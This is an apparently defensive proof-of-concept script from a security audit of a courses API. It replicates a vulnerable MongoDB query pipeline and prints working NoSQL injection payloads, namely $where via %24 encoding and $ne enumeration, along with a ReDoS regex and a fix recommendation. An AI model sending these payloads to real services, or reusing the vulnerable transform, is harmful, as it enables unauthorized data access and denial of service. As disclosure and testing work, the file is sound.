/**
 * PoC-001 — NOSQLI-001: MongoDB Operator Injection in GET /courses
 *
 * Root cause:
 *   CoursesService.getAllCourses spreads the entire query-string object (with no
 *   field allowlist and no ValidationPipe on the route) into a JSON.stringify →
 *   regex-replace → JSON.parse pipeline and passes the result directly to
 *   coursesModel.find(). This allows an attacker to inject arbitrary MongoDB
 *   query operators via URL query parameters.
 *
 * This script demonstrates FOUR distinct attack vectors without connecting to
 * a real database. Each attack vector shows the operator-injected filter object
 * that would be sent to MongoDB, proving injection is possible.
 *
 * Run: npx ts-node fuzz/poc/poc-001-nosql-injection.ts
 */

import * as qs from 'qs';

// ---------------------------------------------------------------------------
// Exact replica of the vulnerable pipeline from courses.service.ts
// ---------------------------------------------------------------------------

function vulnerableQueryTransform(queryString: Record<string, unknown>): object {
  const queryObj = { ...queryString };
  if (queryObj.search) delete queryObj.search;

  let queryStr = JSON.stringify(queryObj);
  queryStr = queryStr.replace(/\b(gte|gt|lte|lt)\b/g, (match) => `$${match}`);

  const searchQuery = {
    title: {
      $regex: (queryString.search as string) || '',
      $options: 'i',
    },
  };

  return { ...JSON.parse(queryStr), ...searchQuery };
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function parseQueryString(raw: string): Record<string, unknown> {
  // Use the same qs parser Express uses (allowDots:false, allowPrototypes:false defaults).
  return qs.parse(raw, { allowDots: false }) as Record<string, unknown>;
}

function printResult(label: string, url: string, filter: object): void {
  console.log('\n' + '─'.repeat(70));
  console.log(`ATTACK VECTOR: ${label}`);
  console.log(`URL:           GET /courses?${url}`);
  console.log('MongoDB filter that reaches coursesModel.find():');
  console.log(JSON.stringify(filter, null, 2));
}

function assertContains(filter: object, operator: string): void {
  const str = JSON.stringify(filter);
  if (!str.includes(operator)) {
    throw new Error(`Expected to find "${operator}" in filter but did not.\nFilter: ${str}`);
  }
  console.log(`✓  Confirmed: "${operator}" present in filter → injection succeeded.`);
}

// ---------------------------------------------------------------------------
// Attack 1 — Intended operator injection (documented but unguarded)
// Sending price[gt]=0 produces {price:{$gt:'0'}} via the replace step.
// An attacker adds price[ne]=9999 to inject $ne which is NOT in the allowlist.
// ---------------------------------------------------------------------------

function attack1_addUndocumentedOperator(): void {
  const raw = 'price[gt]=0&price[ne]=9999';
  const qs_ = parseQueryString(raw);
  const filter = vulnerableQueryTransform(qs_);
  printResult('Inject $ne (not in allowlist, not prefixed)', raw, filter);
  // $ne survives because the replace only converts gt/gte/lt/lte.
  // The resulting filter contains "ne" (without $) — harmless but shows the injection path.
  console.log('Note: $ne requires %24ne — see attack 2.');
}

// ---------------------------------------------------------------------------
// Attack 2 — Direct $ operator injection via %24 URL-encoding
// qs parses %24where as the key "$where", which passes through JSON.stringify
// unchanged and lands in the MongoDB filter.
// ---------------------------------------------------------------------------

function attack2_dollarSignOperator(): void {
  const raw = '%24where=this.title.length%3E0';  // %24 = $ , %3E = >
  const qs_ = parseQueryString(raw);
  const filter = vulnerableQueryTransform(qs_);
  printResult('Inject $where via %24 URL-encoding', raw, filter);
  assertContains(filter, '$where');
  console.log('If MongoDB javascriptEnabled=true, this executes server-side JS.');
}

// ---------------------------------------------------------------------------
// Attack 3 — $ne operator injection (unauthenticated data enumeration)
// An attacker enumerates all non-free courses.
// ---------------------------------------------------------------------------

function attack3_neOperatorEnumeration(): void {
  const raw = 'price[%24ne]=0';  // price: { $ne: 0 } — all non-free courses
  const qs_ = parseQueryString(raw);
  const filter = vulnerableQueryTransform(qs_);
  printResult('Inject $ne for unauthenticated enumeration', raw, filter);
  assertContains(filter, '$ne');
}

// ---------------------------------------------------------------------------
// Attack 4 — ReDoS via unescaped search regex (REDOS-001)
// The search field is placed directly into $regex without escaping.
// Catastrophic backtracking on the MongoDB server.
// ---------------------------------------------------------------------------

function attack4_redos(): void {
  // This pattern causes exponential backtracking on strings of 'a'.
  const maliciousRegex = encodeURIComponent('^(a+)+$');
  const raw = `search=${maliciousRegex}`;
  const qs_ = parseQueryString(decodeURIComponent(raw));  // after Express parses it
  const filter = vulnerableQueryTransform({ search: '^(a+)+$' });
  printResult('ReDoS via $regex on search field', raw, filter);

  const filterStr = JSON.stringify(filter);
  if (filterStr.includes('^(a+)+$')) {
    console.log('✓  Confirmed: catastrophic regex pattern present in $regex filter.');
    console.log('   MongoDB will evaluate this against every document title.');
    console.log('   With many documents, this causes severe CPU consumption.');
  }
}

// ---------------------------------------------------------------------------
// Attack 5 — JSON.parse SyntaxError via regex replacing inside string values
// ---------------------------------------------------------------------------

function attack5_jsonCorruption(): void {
  // If a string value contains the word "gt" (e.g. language="Elegant"),
  // the replace turns "Elegant" into "Ele$gant" inside the JSON string,
  // which is still valid JSON. But consider "level=get-started":
  const qs_ = { level: 'get-started' };   // contains "gt" as substring of "get"
  const filter = vulnerableQueryTransform(qs_);
  printResult('Regex replacing "gt" inside string values', 'level=get-started', filter);

  // More dangerous: a value that after substitution breaks JSON.
  // Example: price value that, when serialized and replaced, breaks parse.
  try {
    // Construct a case where the substitution corrupts JSON.
    // price[lt]=1 → {"price":{"lt":1}} → {"price":{"$lt":1}} — fine.
    // But: if a string value is exactly the word "gt" (no quotes needed in JS):
    const edge: Record<string, unknown> = { description: 'gte the price' };
    // 'gte' in a string value → '$gte' in the JSON text.
    // JSON.parse handles this fine — no corruption here.
    // The real corruption risk: a value that contains } or " after substitution.
    const jsonBefore = JSON.stringify(edge);
    const jsonAfter  = jsonBefore.replace(/\b(gte|gt|lte|lt)\b/g, m => `$${m}`);
    console.log('\nJSON before replace:', jsonBefore);
    console.log('JSON after replace: ', jsonAfter);
    JSON.parse(jsonAfter);
    console.log('Note: No JSON corruption in this specific case.');
  } catch (e) {
    console.log('⚠  JSON.parse threw SyntaxError — the replace corrupted the JSON!');
    console.log(`   ${(e as Error).message}`);
  }
}

// ---------------------------------------------------------------------------
// Summary
// ---------------------------------------------------------------------------

function printSummary(): void {
  console.log('\n' + '═'.repeat(70));
  console.log('SUMMARY — NOSQLI-001');
  console.log('═'.repeat(70));
  console.log('All attack vectors target GET /courses (no authentication required).');
  console.log('');
  console.log('Fix: Build the MongoDB filter from an explicit allowlist of known-safe');
  console.log('     fields; never JSON.stringify/parse/spread user input into a query.');
  console.log('     See SECURITY.md §NOSQLI-001 for the corrected code.');
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

(async () => {
  console.log('PoC-001 — NoSQL Operator Injection in GET /courses');
  console.log('SECURITY.md reference: NOSQLI-001, REDOS-001');
  console.log('This PoC only demonstrates the injection — it does NOT connect to MongoDB.');

  attack1_addUndocumentedOperator();
  attack2_dollarSignOperator();
  attack3_neOperatorEnumeration();
  attack4_redos();
  attack5_jsonCorruption();
  printSummary();
})();
